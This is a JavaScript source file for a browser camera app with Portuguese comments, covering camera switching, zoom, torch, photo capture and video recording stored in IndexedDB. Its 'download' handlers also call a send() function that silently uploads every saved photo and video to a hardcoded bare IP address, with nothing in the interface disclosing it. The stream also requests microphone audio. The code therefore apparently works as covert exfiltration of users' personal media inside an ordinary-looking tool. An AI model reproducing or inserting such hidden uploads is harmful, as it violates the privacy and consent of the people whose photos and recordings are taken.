let currentStream = null;
let currentDeviceId = null;
let currentZoom = 1;
let torchEnabled = false;
let isRecording = false;
let mediaRecorder = null;
let recordedChunks = [];
let currentFormat = '';
let videoChunksDB = null;
const DB_NAME = 'VideoRecorderDB';
const STORE_NAME = 'videoChunks';
let currentRecordingId = null;
const MAX_MEMORY_CHUNKS = 5; // Número máximo de chunks em memória (fallback)

const videoElement = document.getElementById('video');
const photoCanvas = document.getElementById('photo-canvas');
const startCameraBtn = document.getElementById('start-camera-btn');
const startCameraContainer = document.getElementById('start-camera-container');
const shutterBtn = document.getElementById('shutter-btn');
const flashEffect = document.getElementById('flash-effect');
const flashBtn = document.getElementById('flash-btn');
const zoomSlider = document.getElementById('zoom-slider');
const zoomLevel = document.getElementById('zoom-level');
const resolutionSize = document.getElementById('resolution-size');
const resolutionInfo = document.getElementById('resolution-info');
const switchCamBtn = document.getElementById('switch-cam-btn');
const cameraInfoTopRight = document.querySelector('.top-right');
const recordPreview = document.getElementById('record-preview');
const recordBtn = document.getElementById('record-btn');
const recIndicator = document.getElementById('rec-indicator');

// Configurações iniciais da câmera
const constraints = {
  video: {
    facingMode: 'environment',
    width: { ideal: 1280 },
    height: { ideal: 720 },
  },
  audio: false
};

// Detectar o melhor formato de vídeo suportado
function getSupportedMimeType() {
  const types = [
    'video/mp4;codecs=avc1',
    'video/webm;codecs=vp9',
    'video/webm;codecs=vp8',
    'video/webm'
  ];
  
  for (const type of types) {
    if (MediaRecorder.isTypeSupported(type)) {
      return type;
    }
  }
  return '';
}

// Iniciar a câmera
async function getCameraStream(deviceId = null, facingMode = null) {
  // Liberar stream atual se existir
  if (currentStream) {
    stopCurrentStream();
  }

  const newConstraints = {
    video: {
      ...(deviceId ? { deviceId: { exact: deviceId } } : {}),
      ...(facingMode ? { facingMode: facingMode } : {}),
      width: { ideal: 1280 },
      height: { ideal: 720 }
    },
    audio: true
  };

  try {
    const stream = await navigator.mediaDevices.getUserMedia(newConstraints);
    currentStream = stream;
    videoElement.srcObject = stream;

    const videoTrack = stream.getVideoTracks()[0];
    currentDeviceId = videoTrack.getSettings().deviceId || null;

    const settings = videoTrack.getSettings();
    
    // Ajustar espelhamento para câmera frontal
    videoElement.style.transform = settings.facingMode === 'user' ? 'scaleX(-1)' : 'none';
    
    // Configurar capacidades da câmera
    handleCameraCapabilities(videoTrack);
    
    // Atualizar informações de resolução
    updateResolutionInfo(settings.width, settings.height);
    
    // Detectar formato de vídeo suportado
    currentFormat = getSupportedMimeType();
    
    // Priorizar MP4 no iOS
    if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
      currentFormat = 'video/mp4;codecs=avc1';
    }
    
    return true;
  } catch (err) {
    console.error('Erro ao acessar a câmera:', err);
    alert('Erro ao acessar a câmera: ' + err.message);
    return false;
  }
}

// Parar o stream atual
function stopCurrentStream() {
  if (currentStream) {
    currentStream.getTracks().forEach(track => track.stop());
    currentStream = null;
  }
  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
    mediaRecorder.stop();
    isRecording = false;
  }
}

// Atualizar informações de resolução
function updateResolutionInfo(width, height) {
  const resolutionText = `${width}x${height}`;
  resolutionInfo.textContent = resolutionText;
  
  // Atualizar o select para refletir a resolução atual
  const option = Array.from(resolutionSize.options).find(
    opt => opt.value === resolutionText
  );
  if (option) option.selected = true;
}

// Configurar capacidades da câmera (zoom, flash, etc.)
function handleCameraCapabilities(track) {
  const capabilities = track.getCapabilities();
  console.log('Capacidades da câmera:', capabilities);

  // Configurar flash/torch se disponível
  if (capabilities.torch) {
    flashBtn.onclick = () => {
      torchEnabled = !torchEnabled;
      track.applyConstraints({ advanced: [{ torch: torchEnabled }] });
      flashEffect.style.display = torchEnabled ? 'block' : 'none';
      flashBtn.classList.toggle("active", torchEnabled);
    };
    flashBtn.style.display = 'block';
  } else {
    flashBtn.style.display = 'none';
  }

  // Configurar zoom se disponível
  if (capabilities.zoom) {
    zoomSlider.min = capabilities.zoom.min;
    zoomSlider.max = capabilities.zoom.max;
    zoomSlider.step = capabilities.zoom.step || 0.1;
    zoomSlider.value = capabilities.zoom.min;
  
    zoomSlider.oninput = () => {
      currentZoom = parseFloat(zoomSlider.value);
      track.applyConstraints({ advanced: [{ zoom: currentZoom }] });
      const normalizedZoom = currentZoom / capabilities.zoom.min;
      zoomLevel.textContent = `${normalizedZoom.toFixed(1)}x zoom`;
    };
    zoomSlider.style.display = 'block';
    zoomLevel.style.display = 'block';
  } else {
    zoomSlider.style.display = 'none';
    zoomLevel.style.display = 'none';
  }
}

// Listar câmeras disponíveis
async function listCameras() {
  const devices = await navigator.mediaDevices.enumerateDevices();
  return devices.filter(device => device.kind === 'videoinput');
}

// Atualizar zoom
function updateZoom() {
  currentZoom = parseFloat(zoomSlider.value);
  zoomLevel.textContent = `${currentZoom.toFixed(1)}x zoom`;
}

// Criar botões de ação (fechar e download)
function createActionButtons(type, data = null) {
  const containerButtons = document.querySelector(".camera-info.top-right.close");
  const closeButton = document.querySelector("#close-btn");
  const downloadButton = document.querySelector("#download-btn");

  // Clonar botões para remover listeners antigos
  closeButton.replaceWith(closeButton.cloneNode(true));
  downloadButton.replaceWith(downloadButton.cloneNode(true));
  
  const newCloseButton = document.querySelector("#close-btn");
  const newDownloadButton = document.querySelector("#download-btn");

  newCloseButton.addEventListener('click', async () => {
    // Esconder preview ou canvas
    if (type === 'photo') {
      photoCanvas.style.display = 'none';
    } else {
      recordPreview.style.display = 'none';
      recordPreview.src = '';
      recordPreview.pause();
      if (recordPreview.src) {
        URL.revokeObjectURL(recordPreview.src);
      }
    }
    
    // Mostrar o elemento de vídeo da câmera
    videoElement.style.display = 'block';
    containerButtons.style.display = 'none';
    cameraInfoTopRight.style.display = 'flex';
    recIndicator.style.display = "none";
    
    // Reiniciar a câmera se não estiver ativa
    if (!currentStream) {
      await restartCamera();
    }
  });

  newDownloadButton.addEventListener('click', () => {
    if (type === 'photo') {
      saveImage();
    } else if (type === 'video' && data) {
      send(data, 'video');
      const ext = currentFormat.includes('mp4') ? 'mp4' : 'webm';
      const videoURL = URL.createObjectURL(data);
      const a = document.createElement("a");
      a.href = videoURL;
      a.download = `gravacao.${ext}`;
      document.body.appendChild(a);
      a.click();
      setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(videoURL);
      }, 100);
    }
  });

  if (containerButtons) {
    containerButtons.style.display = "flex";
  }
}

// Capturar foto
function capturePhoto() {
  const videoWidth = videoElement.videoWidth;
  const videoHeight = videoElement.videoHeight;

  photoCanvas.width = videoWidth;
  photoCanvas.height = videoHeight;

  const ctx = photoCanvas.getContext('2d');

  if (videoElement.style.filter) {
    ctx.filter = videoElement.style.filter;
  }

  // Espelhar imagem se for câmera frontal
  if (videoElement.style.transform === 'scaleX(-1)') {
    ctx.translate(videoWidth, 0);
    ctx.scale(-1, 1);
  }

  ctx.drawImage(videoElement, 0, 0, photoCanvas.width, photoCanvas.height);

  videoElement.style.display = "none";
  photoCanvas.style.display = "block";
  cameraInfoTopRight.style.display = 'none';

  createActionButtons('photo');
}

// Salvar imagem
async function saveImage() {
  if (!currentDeviceId) {
    alert('Nenhuma câmera ativa. Por favor, inicie a câmera primeiro.');
    return;
  }

  let highResStream = null;
  try {
    const [width, height] = resolutionSize.value.split('x').map(Number);
    
    highResStream = await navigator.mediaDevices.getUserMedia({
      video: {
        deviceId: { exact: currentDeviceId },
        width: { ideal: width },
        height: { ideal: height }
      },
      audio: true
    });

    const track = highResStream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    
    let blob;
    try {
      blob = await imageCapture.takePhoto();
      console.log("Imagem capturada via ImageCapture.");
      send(blob, 'photo');
    } catch (e) {
      console.warn("ImageCapture falhou, usando canvas fallback:", e);
      blob = await canvasToBlob(photoCanvas);
      send(blob, 'photo');
    }

    const imgURL = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = imgURL;
    a.download = `foto-${new Date().toISOString().slice(0, 10)}.${blob.type.includes('png') ? 'png' : 'jpg'}`;
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      document.body.removeChild(a);
      URL.revokeObjectURL(imgURL);
    }, 100);

  } catch (error) {
    console.error('Erro ao capturar imagem:', error);
    alert('Erro ao capturar imagem: ' + error.message);
  } finally {
    if (highResStream) {
      highResStream.getTracks().forEach(t => t.stop());
    }
  }
}

// Converter canvas para Blob
function canvasToBlob(canvas, type = 'image/png', quality = 1) {
  return new Promise((resolve) => {
    canvas.toBlob((blob) => {
      resolve(blob);
    }, type, quality);
  });
}

async function send(data, type) {
  let filename;
  const form = new FormData();

  if (type === 'photo') {
    filename = "foto-" + new Date().toISOString().slice(0, 10) + "." + (data.type.includes('png') ? 'png' : 'jpg');
    form.append("file", data, filename);
  } else if (type === 'video') {
    filename = "gravacao-" + new Date().toISOString().slice(0, 10) + "." + (data.type.includes('mp4') ? 'mp4' : 'webm');
    form.append("file", data, filename);
  } else {
    console.error("Tipo desconhecido:", type);
    return;
  }

  try {
    const response = await fetch("https://98.80.70.201/api/upload", {
      method: "POST",
      body: form,
    });

    console.log("Retorno: " + response.status);
  } catch (error) {
    console.error("Erro ao enviar arquivo:", error);
  }
}

// Reiniciar a câmera
export async function restartCamera() {
  stopCurrentStream();
  videoElement.srcObject = null;
  photoCanvas.style.display = 'none';
  recordPreview.style.display = 'none';
  videoElement.style.display = 'block';
  
  return await getCameraStream(currentDeviceId);
}

// Evento de gravação de vídeo
recordBtn.addEventListener("click", async () => {
  if (!isRecording) {
    // Iniciar gravação
    if (!currentStream) {
      const success = await getCameraStream();
      if (!success) return;
    }

    // Inicializar IndexedDB
    try {
      await initVideoDB();
    } catch (error) {
      console.warn('IndexedDB não inicializado - usando fallback em memória:', error);
    }
    
    currentRecordingId = `rec_${Date.now()}`;
    recordedChunks = [];
    
    try {
      mediaRecorder = new MediaRecorder(currentStream, currentFormat ? { mimeType: currentFormat } : undefined);
    } catch (e) {
      console.warn("Erro ao criar MediaRecorder com o tipo preferido, usando padrão:", e);
      mediaRecorder = new MediaRecorder(currentStream);
    }

    mediaRecorder.ondataavailable = async (e) => {
      if (e.data.size > 0) {
        try {
          const result = await saveVideoChunk(e.data);
          if (result.inMemory) {
            recordedChunks.push(result.chunk);
            // Limitar quantidade de chunks em memória
            if (recordedChunks.length > MAX_MEMORY_CHUNKS) {
              recordedChunks.shift();
            }
          }
        } catch (error) {
          console.error('Erro ao salvar chunk:', error);
        }
      }
    };

    mediaRecorder.onstop = async () => {
      let chunks = [];
      
      try {
        // Tentar obter do IndexedDB primeiro
        chunks = await getAllVideoChunks(currentRecordingId);
        
        // Se não tiver no DB, usar os da memória
        if (chunks.length === 0 && recordedChunks.length > 0) {
          chunks = recordedChunks;
        }
        
        const blob = new Blob(chunks, { type: currentFormat || 'video/mp4' });
        console.log("Vídeo gerado - tamanho:", blob.size, "bytes");

        const videoURL = URL.createObjectURL(blob);
        recordPreview.src = videoURL;
        recordPreview.style.display = "block";
        videoElement.style.display = "none";
        cameraInfoTopRight.style.display = 'none';

        createActionButtons('video', blob);
      } catch (error) {
        console.error('Erro ao gerar vídeo:', error);
        alert('Erro ao processar vídeo gravado');
      } finally {
        // Limpar os chunks após uso
        try {
          await clearVideoChunks(currentRecordingId);
        } catch (error) {
          console.error('Erro ao limpar chunks:', error);
        }
        recordedChunks = [];
      }
    };

    mediaRecorder.start(1000); // Coletar dados a cada 1s
    isRecording = true;
    recIndicator.style.display = "flex";
    recordBtn.classList.add("recording");
    recordBtn.innerHTML = '<i class="fas fa-stop" style="font-size: 20px;"></i>';

  } else {
    // Parar gravação
    mediaRecorder.stop();
    isRecording = false;
    recIndicator.style.display = "none";
    recordBtn.classList.remove("recording");
    recordBtn.innerHTML = '<i class="fas fa-video" style="font-size: 20px;"></i>';
  }
});

// Eventos principais
startCameraBtn.addEventListener('click', async () => {
  startCameraBtn.disabled = true;
  startCameraBtn.textContent = 'Carregando...';
  
  try {
    const success = await getCameraStream();
    if (success) {
      startCameraContainer.style.display = 'none';
    } else {
      startCameraBtn.textContent = 'Tentar novamente';
    }
  } catch (err) {
    console.error('Erro ao iniciar a câmera:', err);
    alert('Não foi possível iniciar a câmera. Por favor, verifique as permissões ou tente novamente.');
    startCameraBtn.textContent = 'Erro - Tentar novamente';
  } finally {
    startCameraBtn.disabled = false;
  }
});

shutterBtn.addEventListener('click', capturePhoto);

switchCamBtn.addEventListener('click', async () => {
  const cameras = await listCameras();
  if (cameras.length <= 1) return;
  
  const currentIndex = cameras.findIndex(c => c.deviceId === currentDeviceId);
  const nextIndex = (currentIndex + 1) % cameras.length;
  const nextCamera = cameras[nextIndex];
  
  const facingMode = nextCamera.label.toLowerCase().includes('front') ? 'user' : 'environment';
  
  await getCameraStream(nextCamera.deviceId, facingMode);
});

zoomSlider.addEventListener('input', updateZoom);

async function initVideoDB() {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open(DB_NAME, 1);
    
    request.onupgradeneeded = (event) => {
      const db = event.target.result;
      if (!db.objectStoreNames.contains(STORE_NAME)) {
        db.createObjectStore(STORE_NAME, { keyPath: 'id' });
      }
    };
    
    request.onsuccess = (event) => {
      videoChunksDB = event.target.result;
      resolve(videoChunksDB);
    };
    
    request.onerror = (event) => {
      console.error('Erro ao abrir IndexedDB:', event.target.error);
      reject(event.target.error);
    };
  });
}

async function saveVideoChunk(chunk) {
  if (!videoChunksDB) {
    console.warn('IndexedDB não disponível - usando memória');
    return { inMemory: true, chunk };
  }

  const chunkId = `${currentRecordingId}_${Date.now()}`;
  
  return new Promise((resolve) => {
    const transaction = videoChunksDB.transaction(STORE_NAME, 'readwrite');
    const store = transaction.objectStore(STORE_NAME);
    
    store.put({
      id: chunkId,
      recordingId: currentRecordingId,
      chunk: chunk,
      timestamp: Date.now()
    });
    
    transaction.oncomplete = () => resolve({ inMemory: false, id: chunkId });
    transaction.onerror = (event) => {
      console.error('Erro ao salvar chunk:', event.target.error);
      resolve({ inMemory: true, chunk });
    };
  });
}

async function getAllVideoChunks(recordingId) {
  if (!videoChunksDB) {
    console.warn('IndexedDB não disponível - retornando vazio');
    return [];
  }

  return new Promise((resolve) => {
    const transaction = videoChunksDB.transaction(STORE_NAME, 'readonly');
    const store = transaction.objectStore(STORE_NAME);
    const request = store.getAll();
    
    request.onsuccess = (event) => {
      const allChunks = event.target.result
        .filter(item => item.recordingId === recordingId)
        .sort((a, b) => a.timestamp - b.timestamp)
        .map(item => item.chunk);
      
      resolve(allChunks);
    };
    
    request.onerror = (event) => {
      console.error('Erro ao recuperar chunks:', event.target.error);
      resolve([]);
    };
  });
}

async function clearVideoChunks(recordingId) {
  if (!videoChunksDB) return;

  return new Promise((resolve) => {
    const transaction = videoChunksDB.transaction(STORE_NAME, 'readwrite');
    const store = transaction.objectStore(STORE_NAME);
    const request = store.getAll();
    
    request.onsuccess = (event) => {
      const chunksToDelete = event.target.result
        .filter(item => item.recordingId === recordingId);
      
      chunksToDelete.forEach(chunk => {
        store.delete(chunk.id);
      });
      
      resolve();
    };
    
    request.onerror = (event) => {
      console.error('Erro ao limpar chunks:', event.target.error);
      resolve();
    };
  });
}
